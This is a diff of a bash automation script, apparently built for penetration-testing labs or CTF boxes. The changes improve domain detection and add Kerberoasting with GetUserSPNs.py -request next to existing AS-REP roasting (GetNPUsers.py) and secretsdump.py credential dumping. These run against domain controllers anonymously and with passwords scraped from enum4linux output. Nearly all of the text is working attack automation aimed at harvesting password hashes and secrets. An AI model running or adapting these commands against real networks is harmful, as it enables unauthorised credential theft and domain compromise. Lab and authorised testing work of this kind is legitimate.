@@ -572,14 +572,20 @@ while IFS=: read -r ligne
         if [ $? -eq 2 ]; then continue; fi
         domain="$(cat $f_oports | grep '445/tcp' | grep workgroup | cut -d':' -f2 | cut -d')' -f1)"
         if [ "$domain" = "" ]; then
-          domain="$(enum4linux -a $ip 2>/dev/null | grep 'Domain Name'  | cut -d ':' -f 2)"
-        elif [ "$domain" = "" ]; then 
+          domain="$(cat $f_oports | grep -i ldap -m 1 | cut -d':' -f 2 | cut -d',' -f 1)"
+        fi
+        if [ "$domain" = "" ]; then
+          domain="$(enum4linux -a $ip 2>/dev/null | grep 'Domain Name' -m 1 | cut -d ':' -f 2)"
+        fi
+        if [ "$domain" = "" ]; then 
           domain="WORKGROUP"
         fi
         ## comand with anonymous user
         target="${domain}/guest"
-        echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass"   | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt
+        echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass\n"   | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt
         GetNPUsers.py  -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt
+        echo "\n\$ GetUserSPNs.py -request -dc-ip $ip $target -no-pass\n"   | tee -a ${boxe_path}/kerberos/kerberosrecon_${port}.txt
+        GetUserSPNs.py -request -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt
         if [ "$(cat $f_oports | grep '139/tcp')" != "" ]; then 
           # verify if we found some users
           enum4linux -U $ip 2> /dev/null > ${boxe_path}/kerberos/enum-users.txt
@@ -593,21 +599,25 @@ while IFS=: read -r ligne
                 for pass in $(cat ${boxe_path}/kerberos/enum-users.txt  | grep -i 'password set to' | sed  's/Password set to /&>/' | cut -d'>' -f 2 )
                  do
                    if [ "$(GetNPUsers.py  -dc-ip $ip $target:$pass | grep 'SessionError')"  = "" ] &&  [ "$(GetNPUsers.py  -dc-ip $ip $target:$pass | grep 'doesn.t have' )"  = "" ]; then
-                     echo "\$ GetNPUsers.py  -dc-ip $ip '$target:$pass' " | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                     echo "\$ GetNPUsers.py  -dc-ip $ip '$target:$pass' \n" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
                      GetNPUsers.py  -dc-ip $ip $target:$pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                     echo "\n\$ GetUserSPNs.py -request -dc-ip $ip '$target:$pass' \n" | tee -a ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
+                     GetUserSPNs.py -request -dc-ip $ip $target:$pass >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$user
                    fi
                    if [ "$(secretsdump.py   ${target}:$pass@${ip}  | grep -i 'Error' )"  = "" ]; then
-                     echo "\$ secretsdump.py   '${target}:$pass'@${ip}" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC
+                     echo "\$ secretsdump.py   '${target}:$pass'@${ip}\n" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC
                      secretsdump.py   ${target}:$pass@${ip}   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC
                    fi
                  done 
               fi
               if [ "$(GetNPUsers.py  -dc-ip $ip $target -no-pass | grep 'SessionError')"  = "" ] &&  [ "$(GetNPUsers.py  -dc-ip $ip $target -no-pass | grep 'doesn.t have' )"  = "" ]; then
-                echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
+                echo "\$ GetNPUsers.py  -dc-ip $ip $target -no-pass\n" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
                 GetNPUsers.py  -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
+                echo "\n\$ GetUserSPNs.py -request -dc-ip $ip $target -no-pass\n" | tee -a ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
+                GetUserSPNs.py -request -dc-ip $ip $target -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userGET
               fi
               if [ "$(secretsdump.py   ${target}@${ip} -no-pass | grep -i 'Error' )"  = "" ]; then
-                echo "\$ secretsdump.py  ${target}@${ip} -no-pass" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC1
+                echo "\$ secretsdump.py  ${target}@${ip} -no-pass\n" | tee ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC1
                 secretsdump.py   ${target}@${ip} -no-pass   >> ${boxe_path}/kerberos/kerberosrecon_${port}.txt$userSEC1
               fi
             done  
